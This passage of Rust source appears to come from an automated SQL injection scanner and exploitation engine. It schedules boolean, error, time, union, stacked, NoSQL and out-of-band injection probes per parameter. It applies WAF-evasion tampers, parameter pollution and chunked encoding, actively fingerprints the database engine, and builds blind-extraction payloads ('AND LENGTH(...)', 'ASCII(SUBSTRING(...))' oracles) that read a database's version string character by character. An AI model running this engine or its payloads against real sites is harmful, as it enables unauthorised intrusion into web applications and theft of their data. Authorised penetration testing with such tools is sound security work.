        // live payload belief + pending hypotheses + stored findings.
        if confirmed && top_prob >= 0.85 && top_kind != crate::dbms::common::DbmsKind::Unknown {
            live_shared.dbms_belief = hyp.dbms_belief.clone();
            for pending in hyps.iter_mut().filter(|h| h.cost_spent == 0) {
                pending.dbms_belief = live_shared.dbms_belief.clone();
            }
            state.write().await.fill_missing_dbms(top_kind);
        }
        if confirmed {
            debug!(param = param_key, technique = %technique, posterior, trials, "hypothesis confirmed");
        } else if refuted {
            debug!(param = param_key, technique = %technique, posterior, "hypothesis refuted (posterior <= 0.04)");
        }
    }
    // Starvation guard: `union` keeps >= 1 probe when enabled, even if the
    // score order truncated it away. Skipped once the global `--request-budget`
    // is spent (le plafond gagne sur la couverture ; l'épuisement per-param
    // implique l'épuisement global car le total partagé majore tout total
    // per-param, donc un seul test global suffit), and once `--max-duration`
    // is exceeded (a hard user time budget must never be silently overshot:
    // a single L2 union run can park ~100 req / ~100s on a slow target, as
    // seen live when detection ran 205s under `--max-duration 120`).
    // NOTE: the EarlyStop veto is intentionally NOT consulted here — the
    // guard's contract is union coverage even on vetoed params (the veto
    // still kills error/time/json/nosql/oob/stacked, saving the bulk).
    let union_enabled = is_technique_enabled(&config.techniques, TechniqueKind::Union);
    let pre_guard_len = executed_kinds.len();
    ensure_union_starvation_guard(&mut executed_kinds, union_enabled);
    let budget_spent = BudgetConfig::is_over_request_budget(
        state.read().await.request_count(),
        config.budget.request_budget,
    );
    let duration_spent =
        BudgetConfig::is_over_max_duration(shared.started, config.budget.max_duration_secs);
    if budget_spent {
        debug!(
            param = param_key,
            request_budget = ?config.budget.request_budget,
            "request-budget spent, skipping union starvation guard"
        );
    } else if duration_spent {
        warn!(
            param = param_key,
            max_duration_secs = ?config.budget.max_duration_secs,
            "max-duration exceeded, skipping union starvation guard"
        );
    } else if executed_kinds.len() > pre_guard_len
        && !cancel.is_cancelled()
        && let Some(hyp) = hyps
            .iter_mut()
            .find(|h| h.technique == TechniqueKind::Union && h.cost_spent == 0)
    {
        debug!(
            param = param_key,
            "union starvation guard: forcing >=1 union probe"
        );
        run_one_technique(
            client,
            state,
            cancel,
            config,
            &live_shared,
            raw_request,
            param,
            hyp,
        )
        .await;
        scheduler.record_outcome(&param_key, hyp.is_confirmed(), hyp.cost_spent.max(1));
    }
    // `--ai-suggest` second-pass (opt-in post-échec/WAF) : gate synchrone
    // interne (0 requête quand OFF/incomplet/déjà-tenté/sans trigger/sous
    // verrou). Borné à `max_suggestions` paires × 2 requêtes, échec
    // silencieux sans finding inventé.
    if config.ai.enabled && !cancel.is_cancelled() {
        let ai_deadline =
            BudgetConfig::detection_deadline(shared.started, config.budget.max_duration_secs);
        run_ai_suggest_for_param(
            client,
            state,
            cancel,
            config,
            &shared.target,
            &shared.target_str,
            param,
            &shared.baseline,
            &shared.marker_set,
            raw_request.as_ref().as_ref(),
            &shared.tampers,
            ProbeOpts::new(config.evasion.hpp, config.evasion.chunked),
            &config.evasion.payload_opts,
            &config.matcher,
            &config.net.ignore_codes,
            config.seed,
            &shared.context,
            &live_shared.dbms_belief,
            ai_deadline,
            false,
        )
        .await;
    }
    // Visibilité du plafond OPT-IN : le scheduler per-param est seedé avec la
    // même valeur (`budget_total`), donc son épuisement confirme l'arrêt sur
    // budget (le `warn!` global ci-dessus a déjà annoncé le stop). `None` =
    // `is_exhausted()` toujours faux : 0 log, chemin inchangé.
    if scheduler.budget().is_exhausted() {
        info!(
            param = param_key,
            request_budget = ?config.budget.request_budget,
            spent = scheduler.budget_spent(),
            "request-budget exhausted for param, detection stopped early (inconclusive without findings)"
        );
    }
    log_scheduler_state(&scheduler, &param_key, "done");
}

/// Dispatch one technique, snapshot findings/requests, fold the outcome into
/// `hyp` via `record_probe/record_trial/record_waf_penalty`.
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn run_one_technique(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    config: &EngineConfig,
    shared: &DetectionShared,
    raw_request: &Arc<Option<RawRequest>>,
    param: &TargetParameter,
    hyp: &mut Hypothesis,
) {
    let kind = hyp.technique;
    let before_findings = state.read().await.findings().len();
    let before_requests = state.read().await.request_count();
    if matches!(
        kind,
        TechniqueKind::Boolean | TechniqueKind::Error | TechniqueKind::Time | TechniqueKind::Union
    ) {
        dispatch_probe_first_half(
            client,
            state,
            cancel,
            config,
            shared,
            raw_request,
            param,
            kind,
        )
        .await;
    } else {
        dispatch_probe_second_half(
            client,
            state,
            cancel,
            config,
            shared,
            raw_request,
            param,
            kind,
        )
        .await;
    }
    let snapshot = state.read().await;
    let new_findings: Vec<Finding> = snapshot
        .findings()
        .iter()
        .skip(before_findings)
        .filter(|f| f.parameter == param.key() && f.technique == kind)
        .cloned()
        .collect();
    let after_requests = snapshot.request_count();
    drop(snapshot);
    // `request_count` is `u64`, costs are `usize`: saturate on 32-bit targets.
    #[allow(clippy::cast_possible_truncation)]
    let cost = after_requests
        .saturating_sub(before_requests)
        .min(usize::MAX as u64) as usize;
    apply_outcome_to_hypothesis(hyp, kind, &new_findings, cost.max(1), &shared.baseline);
    // C6 trace: one summary record per (param, technique) — hashes only, no
    // clear payload/body. `mutation_plan` cites the effective tamper set so
    // `--explain` / replay can attribute cost without storing secrets.
    {
        let plan = mutation_plan_label(&shared.tampers);
        let mut st = state.write().await;
        let seq = st.next_trace_seq();
        let req_hash = crate::reasoning::trace::hash_str_hex(&format!(
            "{}:{}:{}:{}",
            param.key(),
            kind,
            plan,
            config.seed.map_or("none".to_owned(), |s| s.to_string())
        ));
        let resp_hash = crate::reasoning::trace::hash_str_hex(&format!(
            "{}:{}:findings={}",
            param.key(),
            kind,
            new_findings.len()
        ));
        #[allow(clippy::cast_precision_loss)]
        let cost_f = cost.max(1) as f64;
        st.push_trace(crate::reasoning::ProbeRecord::new(
            seq,
            param.key(),
            kind.to_string(),
            plan,
            config.seed,
            req_hash,
            resp_hash,
            hyp.posterior.clamp(0.0, 1.0),
            cost_f,
        ));
    }
}

/// First half of the technique dispatch (boolean/error/time/union).
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn dispatch_probe_first_half(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    config: &EngineConfig,
    shared: &DetectionShared,
    raw_request: &Arc<Option<RawRequest>>,
    param: &TargetParameter,
    kind: TechniqueKind,
) {
    let opts = ProbeOpts::new(config.evasion.hpp, config.evasion.chunked);
    let raw = raw_request.as_ref().as_ref();
    // Shared `--max-duration` deadline for the long per-technique loops
    // (boolean payloads, ORDER BY enumeration, union matrix): a single
    // technique must not silently overshoot an explicit user budget.
    // `None` = unlimited, historical behaviour byte-identical.
    let deadline =
        BudgetConfig::detection_deadline(shared.started, config.budget.max_duration_secs);
    match kind {
        TechniqueKind::Boolean => {
            test_boolean_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
                deadline,
                config.generative.mode,
                config.generative.max_generated,
            )
            .await;
        }
        TechniqueKind::Error => {
            let boolean_enabled = is_technique_enabled(&config.techniques, TechniqueKind::Boolean);
            test_error_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                boolean_enabled,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
            )
            .await;
        }
        TechniqueKind::Time => {
            test_time_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
            )
            .await;
        }
        TechniqueKind::Union => {
            test_union_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
                deadline,
            )
            .await;
        }
        _ => {}
    }
}

/// Second half of the technique dispatch (stacked/json/nosql/oob).
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn dispatch_probe_second_half(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    config: &EngineConfig,
    shared: &DetectionShared,
    raw_request: &Arc<Option<RawRequest>>,
    param: &TargetParameter,
    kind: TechniqueKind,
) {
    let opts = ProbeOpts::new(config.evasion.hpp, config.evasion.chunked);
    let raw = raw_request.as_ref().as_ref();
    match kind {
        TechniqueKind::Stacked => {
            test_stacked_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
            )
            .await;
        }
        TechniqueKind::Json => {
            test_json_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
            )
            .await;
        }
        TechniqueKind::Nosql => {
            test_nosql_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.seed,
                &shared.context,
            )
            .await;
        }
        TechniqueKind::Oob => {
            test_oob_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.oob.oob_domain.clone(),
                config.oob.oob_poll_url.clone(),
                config.oob.oob_wait_secs,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
            )
            .await;
        }
        _ => {}
    }
}

/// Fold a technique outcome into `hyp`. `Finding`s are untouched; only the
/// belief moves. Unconfirmed error hits stay probe-only (no trial) so they
/// can never reach the `>= 0.85 + trial` confirmed state.
/// A confirmed DBMS label (`fill_missing_dbms` bar: `>= 0.85`) also promotes
/// `hyp.dbms_belief` for the next tour: the following technique on the same
/// parameter selects quote-correct, engine-specific payloads instead of
/// re-spraying generics.
fn apply_outcome_to_hypothesis(
    hyp: &mut Hypothesis,
    kind: TechniqueKind,
    new_findings: &[Finding],
    cost: usize,
    baseline: &baseline::Baseline,
) {
    if baseline.is_waf_blocking() {
        hyp.record_waf_penalty();
    }
    if new_findings.is_empty() {
        hyp.record_probe(false, 0.0, cost);
        return;
    }
    let unconfirmed_only = new_findings
        .iter()
        .all(|f| f.evidence.contains("unconfirmed"));
    let (signal, trials) = infer_signal_and_trials(kind, new_findings, unconfirmed_only);
    hyp.record_probe(true, signal, cost);
    for _ in 0..trials {
        hyp.record_trial(true);
    }
    if !unconfirmed_only {
        for finding in new_findings {
            if let Some(dbms_kind) = parse_finding_dbms(finding.dbms.as_deref()) {
                hyp.dbms_belief.update_with_signal(dbms_kind, 0.9);
                break;
            }
        }
    }
}

/// Default positive signal strength + confirming trials per technique.
/// `confirm_either` 3-trial logic lives inside the detectors and is unchanged;
/// one passed detector confirmation counts as one hypothesis trial here.
///
/// Provisional calibration (v0.5): `boolean`/`error` 0.9, `union` 0.85,
/// `time`/`stacked` 0.8 mirror the historical detector confidences
/// (`diff_against_baseline` 0.75/0.85 branches, 3-trial `confirm_either`).
/// Recalibrate against `bench/reports/history.jsonl` once 5+ runs per
/// scenario exist (`run.py compare --from v0.4`): `high` must hold precision
/// `>= 95%`, `medium >= 80%`, else adjust here and re-run the bench matrix.
fn infer_signal_and_trials(
    kind: TechniqueKind,
    new_findings: &[Finding],
    unconfirmed_only: bool,
) -> (f64, usize) {
    if unconfirmed_only {
        return (0.4, 0);
    }
    match kind {
        TechniqueKind::Boolean | TechniqueKind::Error => (0.9, 1),
        TechniqueKind::Time | TechniqueKind::Stacked => (0.8, 1),
        TechniqueKind::Union => (0.85, 1),
        TechniqueKind::Json | TechniqueKind::Nosql => {
            let boolean_channel = new_findings
                .iter()
                .any(|f| f.evidence.contains("channel=boolean"));
            if boolean_channel { (0.9, 1) } else { (0.75, 1) }
        }
        TechniqueKind::Oob => (1.0, 1),
    }
}

impl Engine {
    /// Passive DBMS guess from error findings + banner regex, filling any
    /// missing `dbms` on boolean/time findings.
    /// Recovers the injection point of the first *confirmed* finding (param
    /// name + location parsed back out of `finding.parameter`), falling back
    /// to the first finding then to a synthetic `id` query param when there
    /// is no finding yet. Shared by fingerprint/extraction/enumeration, which
    /// all reuse the same confirmed injection point.
    async fn first_finding_param(&self, target: &TargetUrl) -> (TargetParameter, TargetUrl) {
        let st = self.state.read().await;
        let findings = st.findings().to_vec();
        drop(st);
        // Prefer a confirmed finding so an `0.55 unconfirmed` error never
        // dictates the oracle injection point when a confirmed finding exists.
        let f = findings
            .iter()
            .find(|x| is_confirmed_finding(x))
            .or_else(|| findings.first())
            .cloned();
        if let Some(finding) = f {
            // Recover param from finding.parameter "name@location" (e.g., "id@query", "user@body", "X-Header@header:X-Header").
            // Split at the LAST '@': parameter names may contain '@' (e.g. email-like
            // query keys) while locations (`query`/`body`/`cookie`/`header:<name>`)
            // never do — HTTP header names (RFC 9110 `token`) exclude '@' and ':'.
            let (name, loc_str) = match finding.parameter.rsplit_once('@') {
                Some((n, l)) => (n.to_owned(), l.to_owned()),
                None => (finding.parameter.clone(), "query".to_owned()),
            };
            let location = if loc_str == "query" {
                ParameterLocation::Query
            } else if loc_str == "body" {
                ParameterLocation::Body
            } else if loc_str == "cookie" {
                ParameterLocation::Cookie
            } else if let Some(h) = loc_str.strip_prefix("header:") {
                ParameterLocation::Header(h.to_owned())
            } else {
                // Fallback: treat any unknown as Query, but preserve marker handling via name prefix
                ParameterLocation::Query
            };
            (TargetParameter::new(name, location, "1"), target.clone())
        } else {
            // fallback synthetic
            (
                TargetParameter::new("id", ParameterLocation::Query, "1"),
                target.clone(),
            )
        }
    }

    /// Passive DBMS guess from error findings + banner regex; if both are
    /// inconclusive, falls back to one active differential probe per
    /// candidate DBMS (see [`crate::dbms::common::DbmsDetector::fingerprint_probe`]),
    /// stopping at the first confirmation. Only runs at all when there is
    /// already a confirmed finding — no extra requests on a clean target.
    #[allow(clippy::too_many_arguments)]
    async fn run_fingerprint(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
        matcher: &crate::detection::matcher::MatcherConfig,
    ) {
        if BudgetConfig::is_over_request_budget(
            self.state.read().await.request_count(),
            self.config.budget.request_budget,
        ) {
            warn!("request-budget spent, skipping fingerprint");
            return;
        }
        let findings_snapshot = self.state.read().await.findings().to_vec();
        if findings_snapshot.is_empty() {
            return;
        }
        // Unconfirmed-only snapshots (error `0.55 unconfirmed`) must not feed
        // DBMS guessing: `guess_from_findings` would fill `postgres` from a
        // weak pattern and trigger a doomed enumeration pass.
        if !has_confirmed_finding(&findings_snapshot) {
            return;
        }
        // Guess only from confirmed findings so a leading unconfirmed error
        // (dbms=`postgres` at 0.55) cannot shadow a confirmed boolean.
        let confirmed: Vec<Finding> = findings_snapshot
            .iter()
            .filter(|f| is_confirmed_finding(f))
            .cloned()
            .collect();
        // Explicit `--dbms` hint wins over guessing: fill immediately and skip
        // active probing (saves requests, honours operator knowledge).
        if let Some(hint) = self.dbms_hint_kind() {
            let mut st = self.state.write().await;
            st.fill_missing_dbms(hint);
            info!(
                target=%self.scrubber.scrub(target_str),
                dbms=%hint,
                "fingerprint from --dbms hint"
            );
            return;
        }
        if let Some(kind) = crate::dbms::fingerprint::guess_from_findings(&confirmed) {
            let mut st = self.state.write().await;
            st.fill_missing_dbms(kind);
            info!(
                target=%self.scrubber.scrub(target_str),
                dbms=%kind,
                "fingerprint guessed from findings"
            );
            return;
        }
        // Try banner extraction from evidences
        for f in &confirmed {
            if let Some((kind, ver)) = crate::dbms::fingerprint::extract_banner_version(&f.evidence)
            {
                let mut st = self.state.write().await;
                st.fill_missing_dbms(kind);
                info!(
                    target=%self.scrubber.scrub(target_str),
                    dbms=%kind,
                    version=%ver,
                    "fingerprint banner detected"
                );
                return;
            }
        }
        self.active_fingerprint_probe(
            target,
            target_str,
            marker_set,
            raw_request,
            baseline,
            effective_tampers,
            effective_opts,
            matcher,
        )
        .await;
    }

    /// Sends one true/false probe pair per [`crate::dbms::DbmsKind`] against
    /// the confirmed injection point until one confirms via the standard
    /// boolean true/false-vs-baseline heuristic
    /// ([`BooleanDetector::evaluate_with_match_ratio`]).
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn active_fingerprint_probe(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
        matcher: &crate::detection::matcher::MatcherConfig,
    ) {
        let (param, probe_target) = self.first_finding_param(target).await;
        // P1.1 — purge des zones dynamiques marquées avant comparaison.
        let baseline_body = matcher
            .pre_process(&baseline.strip_dynamic_content(&baseline.representative_body_str()));
        let detector = BooleanDetector::new();
        // Seeded tamper RNG: one sequence per probe phase so `--seed` runs
        // build identical payloads; `None` preserves OS-random behaviour.
        let mut rng = crate::seeded_rng::make_rng(self.config.seed);
        for kind in [
            crate::dbms::DbmsKind::MySql,
            crate::dbms::DbmsKind::Postgres,
            crate::dbms::DbmsKind::MsSql,
            crate::dbms::DbmsKind::Oracle,
        ] {
            if self.cancel.is_cancelled() {
                return;
            }
            let candidate = crate::dbms::fingerprint::get_detector(kind);
            let (true_base, false_base) = candidate.fingerprint_probe();
            let true_payload = build_final_payload_with_rng(
                &true_base,
                effective_tampers,
                &self.config.evasion.payload_opts,
                &mut rng,
            );
            let false_payload = build_final_payload_with_rng(
                &false_base,
                effective_tampers,
                &self.config.evasion.payload_opts,
                &mut rng,
            );

            let Some(true_spec) = build_injection_spec_with_raw(
                &probe_target,
                target_str,
                &param,
                &true_payload,
                marker_set,
                raw_request.as_ref().as_ref(),
                effective_opts,
                &self.config.evasion.payload_opts,
            ) else {
                warn!(dbms=%kind, "fingerprint true spec build failed, skipping");
                continue;
            };
            let start = Instant::now();
            let true_resp = self.client.send_with_retry(true_spec, &self.cancel).await;
            let true_ms = start.elapsed().as_secs_f64() * 1000.0;
            self.state.write().await.increment_requests();
            // Never score a transport/body error as `""` (similarity ~0 =>
            // false positive). Skip this DBMS candidate instead.
            let (true_body, true_status) = match true_resp {
                Ok(r) => {
                    let status = r.status().as_u16();
                    match self.client.read_body_string_with_timeout(r).await {
                        Ok(b) => (b, status),
                        Err(e) => {
                            warn!(error=%e, dbms=%kind, "fingerprint true body read failed, skipping");
                            continue;
                        }
                    }
                }
                Err(e) => {
                    warn!(error=%e, dbms=%kind, "fingerprint true probe failed, skipping");
                    continue;
                }
            };

            if self.cancel.is_cancelled() {
                return;
            }
            let Some(false_spec) = build_injection_spec_with_raw(
                &probe_target,
                target_str,
                &param,
                &false_payload,
                marker_set,
                raw_request.as_ref().as_ref(),
                effective_opts,
                &self.config.evasion.payload_opts,
            ) else {
                warn!(dbms=%kind, "fingerprint false spec build failed, skipping");
                continue;
            };
            let start = Instant::now();
            let false_resp = self.client.send_with_retry(false_spec, &self.cancel).await;
            let false_ms = start.elapsed().as_secs_f64() * 1000.0;
            self.state.write().await.increment_requests();
            let (false_body, false_status) = match false_resp {
                Ok(r) => {
                    let status = r.status().as_u16();
                    match self.client.read_body_string_with_timeout(r).await {
                        Ok(b) => (b, status),
                        Err(e) => {
                            warn!(error=%e, dbms=%kind, "fingerprint false body read failed, skipping");
                            continue;
                        }
                    }
                }
                Err(e) => {
                    warn!(error=%e, dbms=%kind, "fingerprint false probe failed, skipping");
                    continue;
                }
            };

            // Same differential standard as primary detection: `--text-only`
            // pre-processing plus the boolean matcher gate (veto only when
            // BOTH branches violate, so a `--string` oracle signal survives).
            let true_body = matcher.pre_process(&baseline.strip_dynamic_content(&true_body));
            let false_body = matcher.pre_process(&baseline.strip_dynamic_content(&false_body));
            if matcher.gate_boolean(&true_body, &false_body, true_status, false_status)
                == Some(false)
            {
                continue;
            }
            let res = detector.evaluate_with_match_ratio(
                &baseline_body,
                &true_body,
                &false_body,
                baseline.mean_ms,
                true_ms,
                false_ms,
                baseline.match_ratio(),
            );
            if res.is_vulnerable && res.confidence > 0.6 {
                self.state.write().await.fill_missing_dbms(kind);
                info!(
                    target=%self.scrubber.scrub(target_str),
                    dbms=%kind,
                    "active fingerprint confirmed"
                );
                return;
            }
        }
    }

    /// Opt-in (`--extract`) version-string inference: length via `LENGTH()`
    /// binary search, then char-by-char `ASCII(SUBSTRING())` oracle.
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn run_extraction(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
    ) -> crate::error::Result<()> {
        if BudgetConfig::is_over_request_budget(
            self.state.read().await.request_count(),
            self.config.budget.request_budget,
        ) {
            warn!("request-budget spent, skipping extraction");
            return Ok(());
        }
        // Gate: unconfirmed 0.55 error findings alone must never trigger the
        // heavy boolean oracle (~270-700 req into `inference inconsistency`).
        // Require a boolean finding, an error with `extracted=yes`, or an
        // error with `bool_confirm=true`. Empty findings never qualify
        // (early `run_internal` gate already skips, this is defense in depth).
        {
            let snap = self.state.read().await.findings().to_vec();
            if snap.is_empty() {
                warn!("--extract requested but no findings — skipping");
                return Ok(());
            }
            if !is_extraction_eligible(&snap) {
                warn!(
                    "likely FP, extraction skipped (no boolean-confirmed or error-with-fragment finding)"
                );
                return Ok(());
            }
        }
        // Pick first finding's param as injection point for extraction
        let (first_param, target_for_extract) = self.first_finding_param(target).await;

        // Determine DBMS for extraction query (`--dbms` hint wins).
        // Guess from confirmed findings only (see fingerprint gating).
        let dbms_kind = if let Some(hint) = self.dbms_hint_kind() {
            hint
        } else {
            let snap = self.state.read().await.findings().to_vec();
            let confirmed: Vec<Finding> = snap
                .iter()
                .filter(|f| is_confirmed_finding(f))
                .cloned()
                .collect();
            crate::dbms::fingerprint::guess_from_findings(&confirmed)
                .unwrap_or(crate::dbms::DbmsKind::MySql)
        };
        #[allow(clippy::match_same_arms)]
        let version_query = match dbms_kind {
            crate::dbms::DbmsKind::MySql => "SELECT @@version",
            crate::dbms::DbmsKind::Postgres => "SELECT version()",
            crate::dbms::DbmsKind::MsSql => "SELECT @@version",
            crate::dbms::DbmsKind::Oracle => "SELECT banner FROM v$version WHERE ROWNUM=1",
            crate::dbms::DbmsKind::Sqlite => "SELECT sqlite_version()",
            crate::dbms::DbmsKind::Unknown => "SELECT @@version",
        };

        // Build oracle: ASCII(SUBSTRING((query), pos+1, 1)) >= mid
        let baseline_body = baseline.representative_body_str();
        let baseline_mean = baseline.mean_ms;
        let client_clone = self.client.clone();
        let state_clone = Arc::clone(&self.state);
        let cancel_clone = self.cancel.clone();
        let target_str_clone = target_str.to_owned();
        let target_clone2 = target_for_extract.clone();
        let first_param_clone = first_param.clone();
        let marker_set_clone = marker_set.clone();
        let raw_request_clone = raw_request.as_ref().clone();

        // First, infer length via LENGTH(query) if possible (try lengths 1..64)
        // Use retry per guess to mitigate single WAF/network hiccup; require 2 trials.
        // Seeded tamper RNG so `--seed` builds identical payloads.
        let mut rng = crate::seeded_rng::make_rng(self.config.seed);
        let mut inferred_len: usize = 0;
        for len_guess in 1..=64usize {
            if cancel_clone.is_cancelled() {
                break;
            }
            #[allow(clippy::match_same_arms)]
            let base_payload = match dbms_kind {
                crate::dbms::DbmsKind::MySql => {
                    format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                }
                crate::dbms::DbmsKind::Postgres => {
                    format!("' AND LENGTH(({version_query})::text)>={len_guess} --")
                }
                crate::dbms::DbmsKind::MsSql => {
                    format!("' AND LEN(({version_query}))>={len_guess} --")
                }
                crate::dbms::DbmsKind::Oracle => {
                    format!("' AND LENGTH(({version_query}))>={len_guess} --")
                }
                crate::dbms::DbmsKind::Sqlite => {
                    format!("' AND LENGTH(({version_query})::text)>={len_guess} --")
                }
                crate::dbms::DbmsKind::Unknown => {
                    format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                }
            };
            let payload = build_final_payload_with_rng(
                &base_payload,
                effective_tampers,
                &self.config.evasion.payload_opts,
                &mut rng,
            );
            // Retry logic: require 2 probes, treat as true only if majority true.
            // Transport/body errors are never scored (empty body => similarity
            // ~0 => false positive); a guess with no valid trial is skipped
            // without breaking so a transient blip cannot truncate inference.
            let mut true_count = 0usize;
            let mut valid_trials = 0usize;
            for _ in 0..2 {
                let Some(spec) = build_injection_spec_with_raw(
                    &target_clone2,
                    &target_str_clone,
                    &first_param_clone,
                    &payload,
                    &marker_set_clone,
                    raw_request_clone.as_ref(),
                    effective_opts,
                    &self.config.evasion.payload_opts,
                ) else {
                    warn!(
                        len_guess,
                        "extraction probe spec build failed, skipping trial"
                    );
                    continue;
                };
                let start = Instant::now();
                let resp = client_clone.send_with_retry(spec, &cancel_clone).await;
                let ms = start.elapsed().as_secs_f64() * 1000.0;
                state_clone.write().await.increment_requests();
                let body = match resp {
                    Ok(r) => match client_clone.read_body_string_with_timeout(r).await {
                        Ok(b) => b,
                        Err(e) => {
                            warn!(error=%e, len_guess, "extraction probe body read failed, skipping trial");
                            continue;
                        }
                    },
                    Err(e) => {
                        // Cancelled must abort, never be scored or retried as transport noise.
                        if matches!(e, crate::http::client::ClientError::Cancelled) {
                            return Ok(());
                        }
                        warn!(error=%e, len_guess, "extraction probe failed, skipping trial");
                        continue;
                    }
                };
                valid_trials += 1;
                let diff = crate::detection::response_diff::diff_against_baseline(
                    &baseline_body,
                    &body,
                    baseline_mean,
                    ms,
                    100.0,
                );
                if diff.confidence < 0.4 {
                    true_count += 1;
                }
                // small jitter between retries
                if cancel_clone.is_cancelled() {
                    break;
                }
            }
            if valid_trials == 0 {
                warn!(
                    len_guess,
                    "extraction length probe inconclusive (transport errors), skipping guess"
                );
                continue;
            }
            let is_true = valid_trials > 0 && true_count >= valid_trials;
            // Unanimous-of-valid (== majority for the 2-trial loop): a
            // single TRUE glitch must not validate a length guess (it would
            // misalign the whole extraction oracle), and a guess with no
            // valid trial was already skipped above.
            // If we saw 0 true after 2 trials, length guess exceeded
            if !is_true {
                inferred_len = len_guess - 1;
                break;
            }
            if len_guess == 64 {
                inferred_len = 64;
            }
        }
        if inferred_len == 0 {
            warn!("length inference failed, falling back to 16");
            inferred_len = 16; // fallback with warning
        }
        info!(len=%inferred_len, "inferred version length");

        // Now extract string char by char via binary search oracle
        let engine = crate::extraction::engine::ExtractionEngine::new(
            crate::extraction::engine::ExtractionConfig::default(),
        );
        let dbms_for_closure = dbms_kind;
        let version_query_owned = version_query.to_owned();
        let baseline_body2 = baseline_body.clone();
        let baseline_mean2 = baseline_mean;
        let client_for_oracle = client_clone.clone();
        let state_for_oracle = state_clone.clone();
        let cancel_for_oracle = cancel_clone.clone();
        let target_for_oracle = target_clone2.clone();
        let param_for_oracle = first_param_clone.clone();
        let marker_for_oracle = marker_set_clone.clone();
        let raw_for_oracle = raw_request.as_ref().clone();

        let target_str_for_oracle = target_str_clone.clone();
        let tampers_for_oracle = effective_tampers.to_vec();
        let popts_for_oracle = self.config.evasion.payload_opts.clone();
        let seed_for_oracle = self.config.seed;
        let oracle = move |pos: usize, mid: u8| {
            let client = client_for_oracle.clone();
            let state = state_for_oracle.clone();
            let cancel = cancel_for_oracle.clone();
            let target = target_for_oracle.clone();
            let param = param_for_oracle.clone();
            let marker_set = marker_for_oracle.clone();
            let raw = raw_for_oracle.clone();
            let baseline_body = baseline_body2.clone();
            let version_query = version_query_owned.clone();
            let dbms_kind = dbms_for_closure;
            let target_str = target_str_for_oracle.clone();
            let tampers = tampers_for_oracle.clone();
            let popts = popts_for_oracle.clone();
            let opts = effective_opts;
            let seed = seed_for_oracle;
            async move {
                // build ASCII(SUBSTRING) >= mid payload
                #[allow(clippy::match_same_arms)]
                let base = match dbms_kind {
                    crate::dbms::DbmsKind::MySql => format!(
                        "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::Postgres => format!(
                        "' AND ASCII(SUBSTRING(({version_query})::text,{},1))>={} --",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::MsSql => format!(
                        "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} --",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::Oracle => format!(
                        "' AND ASCII(SUBSTR(({version_query}),{},1))>={} --",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::Sqlite => format!(
